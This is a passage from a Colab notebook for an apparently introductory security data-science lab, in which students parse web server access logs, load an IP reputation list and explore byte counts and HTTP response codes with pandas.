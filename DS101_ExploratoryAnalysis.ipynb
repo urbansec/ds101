{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "DS101_ExploratoryAnalysis.ipynb",
      "version": "0.3.2",
      "provenance": [],
      "collapsed_sections": [
        "QuhYDR2Ijjhu",
        "O-ANAxVhNRfe",
        "W6NfvITuRHxT",
        "Ooy4YdJNbTRQ",
        "axQTPJf8kVbd",
        "qAS99IlGtBRZ",
        "VGMqIkoKYBul"
      ],
      "toc_visible": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "metadata": {
        "id": "QuhYDR2Ijjhu",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# Get Set Up"
      ]
    },
    {
      "metadata": {
        "id": "hTAlb_J_Zxsp",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Import Libraries"
      ]
    },
    {
      "metadata": {
        "id": "Yu_GGlGJZMJ_",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Pandas provides an extremely useful data structure\n",
        "import pandas as pd\n",
        "\n",
        "# RE provides regular expression pattern matching\n",
        "import re\n",
        "\n",
        "# datetime provides a datetime object class and conversion utilities\n",
        "from datetime import datetime\n",
        "\n",
        "# Web file access\n",
        "from urllib.request import urlopen\n",
        "\n",
        "# Math provides additional math functions\n",
        "import math\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "CHGVznn_5Z6_",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Define Some Functions"
      ]
    },
    {
      "metadata": {
        "id": "nTDoZ1KHX9Qm",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "def log_ReadFile(logfile):\n",
        "  with open(logfile) as fh:\n",
        "    loglines = fh.readlines()\n",
        "  loglines = [line.strip() for line in loglines]\n",
        "  return loglines"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "YBLuCVQaX90u",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "def log_ReadURL(logfile):\n",
        "  loglines = urlopen(logfile).readlines()\n",
        "  loglines = [line.decode().strip() for line in loglines]\n",
        "  return loglines"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "EG3BBk8Q5eF6",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "def log_Parser(log_list, regx_obj, col_list):\n",
        "  # initialize empty lists for results\n",
        "  logs_parsed = []\n",
        "  parse_fails = []\n",
        "  \n",
        "  # parse logs using supplied regex and column list\n",
        "  for line in log_list:\n",
        "    match = regx_obj.match(line)\n",
        "    if match:\n",
        "      logs_parsed.append([match.group(col) for col in col_list]) \n",
        "    else:\n",
        "      parse_fails.append(line)\n",
        "      \n",
        "  # return parsed data and list of lines that were not parsed correctly\n",
        "  return logs_parsed, parse_fails"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "RHJ-2OMwbKpW",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Load Data"
      ]
    },
    {
      "metadata": {
        "id": "wr_QkeyDbWaB",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# URL of source data file\n",
        "access_url = \"https://raw.githubusercontent.com/urbansec/ds101/master/access.log.2019-03-22\"\n",
        "\n",
        "# Read log files into lists\n",
        "access_logs = log_ReadURL(access_url)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "APLpRuqPYKy2",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# IP reputation indicators\n",
        "intel_url = \"https://raw.githubusercontent.com/urbansec/ds101/master/av_ip_reputation_2019-04-07.csv\"\n",
        "intel_cols = ['ip', 'risk', 'reliability', 'activity', 'country', 'city', 'lat_lon', 'unknown']\n",
        "intel_df = pd.read_csv(intel_url, sep='#', header=None, names=intel_cols)\n",
        "intel_df = intel_df.drop(columns=['unknown'])"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "2sdO6aviEDL1",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# display first 5 lines in list\n",
        "#display(error_logs[:5])"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "x3V0Kif_Ft86",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Parse Data"
      ]
    },
    {
      "metadata": {
        "id": "5q4ks9NpPCRI",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# define a regex pattern to parse lines into fields\n",
        "# sample line:\n",
        "# ['54.36.148.18 - - [22/Mar/2019:01:58:55 -0700] \"GET /self.logs/error.log.2016-04-07.gz HTTP/1.1\" 404 284 \"-\" \"Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)\"']\n",
        "web_access_pattern = re.compile('(?P<client_ip>\\S+)'\n",
        "                                '\\s+(?P<identity>\\S+)'\n",
        "                                '\\s+(?P<username>\\S+)'\n",
        "                                '\\s+\\[(?P<date>[^\\]]+)\\]'\n",
        "                                '\\s+\\\"(?P<request>[^\"]+)\\\"'\n",
        "                                '\\s+(?P<http_response>\\d+)'\n",
        "                                '\\s+(?P<bytes>\\d+)'\n",
        "                                '\\s+\\\"(?P<referrer>[^\"]+)\\\"'\n",
        "                                '\\s+\\\"(?P<user_agent>.*)')\n",
        "\n",
        "# define list of columns to use\n",
        "access_column_list = ['date', 'client_ip', 'request', 'http_response', 'bytes', 'referrer', 'user_agent']\n",
        "\n",
        "\n",
        "# call parser\n",
        "access_logs_parsed, access_logs_parsefail = log_Parser(access_logs, web_access_pattern, access_column_list)\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "CYP7oB1vdZx7",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "### Troubleshooting Only"
      ]
    },
    {
      "metadata": {
        "id": "r-kTT4RXVcwZ",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# test parsing\n",
        "#access_logs_parsed[:5]"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "fZtXP2znYnwh",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# did any lines fail to parse?\n",
        "#access_logs_parsefail[:5]"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "BJqC-hbjBlw9",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Data Frame"
      ]
    },
    {
      "metadata": {
        "id": "bsK8-xVFZMGG",
        "colab_type": "code",
        "outputId": "47da5786-9852-441b-e290-2328ae69df87",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 289
        }
      },
      "cell_type": "code",
      "source": [
        "# convert to Pandas DataFrame and display it\n",
        "access_logs_df = pd.DataFrame.from_records(access_logs_parsed, columns=access_column_list)\n",
        "access_logs_df['date'] = pd.to_datetime(access_logs_df['date'], format='%d/%b/%Y:%H:%M:%S -0700')\n",
        "access_logs_df['bytes'] = pd.to_numeric(access_logs_df['bytes'], errors='coerce')\n",
        "display(access_logs_df.head())"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>date</th>\n",
              "      <th>client_ip</th>\n",
              "      <th>request</th>\n",
              "      <th>http_response</th>\n",
              "      <th>bytes</th>\n",
              "      <th>referrer</th>\n",
              "      <th>user_agent</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>2019-03-22 01:55:15</td>\n",
              "      <td>101.89.29.92</td>\n",
              "      <td>GET / HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>46424</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>2019-03-22 01:57:37</td>\n",
              "      <td>54.36.148.43</td>\n",
              "      <td>GET /self.logs/2015/access.log.2015-05-08.gz H...</td>\n",
              "      <td>200</td>\n",
              "      <td>4813</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>2019-03-22 01:58:55</td>\n",
              "      <td>54.36.148.18</td>\n",
              "      <td>GET /self.logs/error.log.2016-04-07.gz HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>284</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>2019-03-22 02:04:26</td>\n",
              "      <td>54.36.148.62</td>\n",
              "      <td>GET /self.logs/access.log.2016-10-30.gz HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>284</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>2019-03-22 02:04:51</td>\n",
              "      <td>54.36.149.57</td>\n",
              "      <td>GET /self.logs/2016/error.log.2016-05-19.gz HT...</td>\n",
              "      <td>200</td>\n",
              "      <td>867</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                 date     client_ip  \\\n",
              "0 2019-03-22 01:55:15  101.89.29.92   \n",
              "1 2019-03-22 01:57:37  54.36.148.43   \n",
              "2 2019-03-22 01:58:55  54.36.148.18   \n",
              "3 2019-03-22 02:04:26  54.36.148.62   \n",
              "4 2019-03-22 02:04:51  54.36.149.57   \n",
              "\n",
              "                                             request http_response  bytes  \\\n",
              "0                                     GET / HTTP/1.1           200  46424   \n",
              "1  GET /self.logs/2015/access.log.2015-05-08.gz H...           200   4813   \n",
              "2    GET /self.logs/error.log.2016-04-07.gz HTTP/1.1           404    284   \n",
              "3   GET /self.logs/access.log.2016-10-30.gz HTTP/1.1           404    284   \n",
              "4  GET /self.logs/2016/error.log.2016-05-19.gz HT...           200    867   \n",
              "\n",
              "  referrer                                         user_agent  \n",
              "0        -  Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like...  \n",
              "1        -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  \n",
              "2        -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  \n",
              "3        -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  \n",
              "4        -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  "
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "hFuwu0JiVfYc",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        ""
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "8wDLp5R5a0TJ",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# Instructions"
      ]
    },
    {
      "metadata": {
        "id": "rF1BHVuJNbDN",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "In this lab, you will combine techniques from the previous labs to explore an additional dataset.  Namely, you will look at the web access logs from the same server as the error logs we looked at in the Data Basics lab.\n",
        "\n",
        "* To save time, the logs have been parsed already.  They are stored in a Pandas DataFrame called \"access_logs_df\".\n",
        "\n",
        "* Conduct exploratory data analysis to gain insight into these logs and answer the questions defined below.  We recommend inserting text blocks to organize your work, if helpful.  Several collapsible \"header\" sections have been provided to guide your analysis.\n",
        "\n",
        "* The IP reputation data used in the previous labs is also available as a DataFrame.  It is stored in the variable \"intel_df\".\n",
        "\n",
        "**To begin, choose \"Runtime -> Run All\" from the menu options.**"
      ]
    },
    {
      "metadata": {
        "id": "O-ANAxVhNRfe",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# Get a Feel For the Data"
      ]
    },
    {
      "metadata": {
        "id": "H3kEIQjL-Hzq",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "To get started, here are two easy steps provided for you.  Take a look at a sample of the data.  Then examine some basic summary statistics for the entire DataFrame (you should still examine inidividual columns more carefully)."
      ]
    },
    {
      "metadata": {
        "id": "ymk_LGX8cBDv",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Examine the Data"
      ]
    },
    {
      "metadata": {
        "id": "vUze7VKjaR7Q",
        "colab_type": "code",
        "outputId": "a3e8ba70-922b-4c84-db6a-2eb74248c6d3",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 289
        }
      },
      "cell_type": "code",
      "source": [
        "access_logs_df.head()"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>date</th>\n",
              "      <th>client_ip</th>\n",
              "      <th>request</th>\n",
              "      <th>http_response</th>\n",
              "      <th>bytes</th>\n",
              "      <th>referrer</th>\n",
              "      <th>user_agent</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>2019-03-22 01:55:15</td>\n",
              "      <td>101.89.29.92</td>\n",
              "      <td>GET / HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>46424</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>2019-03-22 01:57:37</td>\n",
              "      <td>54.36.148.43</td>\n",
              "      <td>GET /self.logs/2015/access.log.2015-05-08.gz H...</td>\n",
              "      <td>200</td>\n",
              "      <td>4813</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>2019-03-22 01:58:55</td>\n",
              "      <td>54.36.148.18</td>\n",
              "      <td>GET /self.logs/error.log.2016-04-07.gz HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>284</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>2019-03-22 02:04:26</td>\n",
              "      <td>54.36.148.62</td>\n",
              "      <td>GET /self.logs/access.log.2016-10-30.gz HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>284</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>2019-03-22 02:04:51</td>\n",
              "      <td>54.36.149.57</td>\n",
              "      <td>GET /self.logs/2016/error.log.2016-05-19.gz HT...</td>\n",
              "      <td>200</td>\n",
              "      <td>867</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                 date     client_ip  \\\n",
              "0 2019-03-22 01:55:15  101.89.29.92   \n",
              "1 2019-03-22 01:57:37  54.36.148.43   \n",
              "2 2019-03-22 01:58:55  54.36.148.18   \n",
              "3 2019-03-22 02:04:26  54.36.148.62   \n",
              "4 2019-03-22 02:04:51  54.36.149.57   \n",
              "\n",
              "                                             request http_response  bytes  \\\n",
              "0                                     GET / HTTP/1.1           200  46424   \n",
              "1  GET /self.logs/2015/access.log.2015-05-08.gz H...           200   4813   \n",
              "2    GET /self.logs/error.log.2016-04-07.gz HTTP/1.1           404    284   \n",
              "3   GET /self.logs/access.log.2016-10-30.gz HTTP/1.1           404    284   \n",
              "4  GET /self.logs/2016/error.log.2016-05-19.gz HT...           200    867   \n",
              "\n",
              "  referrer                                         user_agent  \n",
              "0        -  Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like...  \n",
              "1        -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  \n",
              "2        -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  \n",
              "3        -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  \n",
              "4        -  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  "
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 13
        }
      ]
    },
    {
      "metadata": {
        "id": "yKA_EOAh-l7A",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Summary Statistics"
      ]
    },
    {
      "metadata": {
        "id": "OAgrZJv8cJLK",
        "colab_type": "code",
        "outputId": "134a4678-107c-4d5e-ef4d-57022687bbf9",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 452
        }
      },
      "cell_type": "code",
      "source": [
        "access_logs_df.describe(include='all')"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>date</th>\n",
              "      <th>client_ip</th>\n",
              "      <th>request</th>\n",
              "      <th>http_response</th>\n",
              "      <th>bytes</th>\n",
              "      <th>referrer</th>\n",
              "      <th>user_agent</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>count</th>\n",
              "      <td>1305</td>\n",
              "      <td>1305</td>\n",
              "      <td>1305</td>\n",
              "      <td>1305</td>\n",
              "      <td>1.305000e+03</td>\n",
              "      <td>1305</td>\n",
              "      <td>1305</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>unique</th>\n",
              "      <td>974</td>\n",
              "      <td>576</td>\n",
              "      <td>503</td>\n",
              "      <td>5</td>\n",
              "      <td>NaN</td>\n",
              "      <td>67</td>\n",
              "      <td>135</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>top</th>\n",
              "      <td>2019-03-23 01:52:10</td>\n",
              "      <td>222.186.57.109</td>\n",
              "      <td>GET / HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>NaN</td>\n",
              "      <td>-</td>\n",
              "      <td>Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>freq</th>\n",
              "      <td>32</td>\n",
              "      <td>23</td>\n",
              "      <td>306</td>\n",
              "      <td>837</td>\n",
              "      <td>NaN</td>\n",
              "      <td>886</td>\n",
              "      <td>241</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>first</th>\n",
              "      <td>2019-03-22 01:55:15</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>last</th>\n",
              "      <td>2019-03-23 02:08:53</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>mean</th>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>1.502533e+05</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>std</th>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>1.735781e+06</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>min</th>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>1.300000e+02</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>25%</th>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>2.950000e+02</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>50%</th>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>1.011000e+03</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>75%</th>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>1.251100e+04</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>max</th>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>5.136711e+07</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                       date       client_ip         request http_response  \\\n",
              "count                  1305            1305            1305          1305   \n",
              "unique                  974             576             503             5   \n",
              "top     2019-03-23 01:52:10  222.186.57.109  GET / HTTP/1.1           200   \n",
              "freq                     32              23             306           837   \n",
              "first   2019-03-22 01:55:15             NaN             NaN           NaN   \n",
              "last    2019-03-23 02:08:53             NaN             NaN           NaN   \n",
              "mean                    NaN             NaN             NaN           NaN   \n",
              "std                     NaN             NaN             NaN           NaN   \n",
              "min                     NaN             NaN             NaN           NaN   \n",
              "25%                     NaN             NaN             NaN           NaN   \n",
              "50%                     NaN             NaN             NaN           NaN   \n",
              "75%                     NaN             NaN             NaN           NaN   \n",
              "max                     NaN             NaN             NaN           NaN   \n",
              "\n",
              "               bytes referrer  \\\n",
              "count   1.305000e+03     1305   \n",
              "unique           NaN       67   \n",
              "top              NaN        -   \n",
              "freq             NaN      886   \n",
              "first            NaN      NaN   \n",
              "last             NaN      NaN   \n",
              "mean    1.502533e+05      NaN   \n",
              "std     1.735781e+06      NaN   \n",
              "min     1.300000e+02      NaN   \n",
              "25%     2.950000e+02      NaN   \n",
              "50%     1.011000e+03      NaN   \n",
              "75%     1.251100e+04      NaN   \n",
              "max     5.136711e+07      NaN   \n",
              "\n",
              "                                               user_agent  \n",
              "count                                                1305  \n",
              "unique                                                135  \n",
              "top     Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...  \n",
              "freq                                                  241  \n",
              "first                                                 NaN  \n",
              "last                                                  NaN  \n",
              "mean                                                  NaN  \n",
              "std                                                   NaN  \n",
              "min                                                   NaN  \n",
              "25%                                                   NaN  \n",
              "50%                                                   NaN  \n",
              "75%                                                   NaN  \n",
              "max                                                   NaN  "
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 14
        }
      ]
    },
    {
      "metadata": {
        "id": "zE3rcEswQ84y",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Based on a quick look at the statistics, there are some factors that stand out as worthy of further investigation.\n",
        "\n",
        "* The standard deviation for the number of bytes transferred per request is larger than the mean.  This indicates a high variance for that variable. \n",
        "* The vast majority of http response codes are 200.  Rows containing other values may be of interest.\n",
        "* The vast majority of http referrers are blank.  Rows containing non-blank values may be of interest.\n",
        "\n",
        "\n",
        "Additionally, we should be sure to explore the data contained in the remaining fields too."
      ]
    },
    {
      "metadata": {
        "id": "W6NfvITuRHxT",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# Data Transfer (bytes)"
      ]
    },
    {
      "metadata": {
        "id": "V_RhkRcCRTqk",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Start by creating a histogram of the \"bytes\" column to understand the shape of the data."
      ]
    },
    {
      "metadata": {
        "id": "DazfW27QcgWh",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Create a histogram\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "jooYESoySsaz",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Almost all of the datapoints are concentrated at the very low end of the spectrum.  Select the rows of the DataFrame with bytes > 1e7 (10,000,000) to see if high values reveal anything interesting."
      ]
    },
    {
      "metadata": {
        "id": "8TD9w9HPRflx",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Filter the dataframe to rows with large values of the \"bytes\" column\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "o4u7uu4DS1b-",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Now filter the dataframe and display a histogram showing only the rows closer to zero (bytes < 1000) to see the frequencies of the smaller values."
      ]
    },
    {
      "metadata": {
        "id": "rLliQwbGVfys",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Filter to rows with bytes < 1000 and display a histogram\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "gaQaVF_vXuNP",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "The majority of these values seem to lay between 200 - 700 bytes.  Examine rows where bytes < 200."
      ]
    },
    {
      "metadata": {
        "id": "HMHq8bKbVn4m",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Display rows with bytes < 200\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "nUo8osSiYMvO",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Since nothing so far has seemed unusual, let's look at the spike of the entries.  Filter the data to rows where the value of \"bytes\" is between 200 and 400."
      ]
    },
    {
      "metadata": {
        "id": "NcJWMGUcXtEd",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Filter to rows where bytes is between 200 - 400 and display\n",
        "# Hint: you can use the \".between() method like... df[df['column'].between(200,400)]\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "miOLIIIbaqWS",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "This seems to contain many errors (http response 404).  Examining the number of bytes transferred has not revealed much of interest, from a security perspective.  It has lead us to a second area of inquiry however."
      ]
    },
    {
      "metadata": {
        "id": "Ooy4YdJNbTRQ",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# HTTP Response Codes (http_response)"
      ]
    },
    {
      "metadata": {
        "id": "ExrqtlVpdLjV",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "As we saw in our initial summary statistics, the majority of HTTP response codes in the dataset are \"200\" (meaning the connection completed normally).  List the frequency of each response code to get a sense of how these are distributed."
      ]
    },
    {
      "metadata": {
        "id": "F-SgnLvYYwo4",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Display frequency counts for the \"http_response\" variable\n",
        "# Hint: use the \".value_counts()\" method\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "gSp7-6USeJ-w",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "HTTP response code 404 indicates a requested file was not found.  Display a sample of 10 rows containing this response code."
      ]
    },
    {
      "metadata": {
        "id": "aH68eBP0edvN",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Display the first 10 rows where the \"http_response\" variable is \"404\"\n",
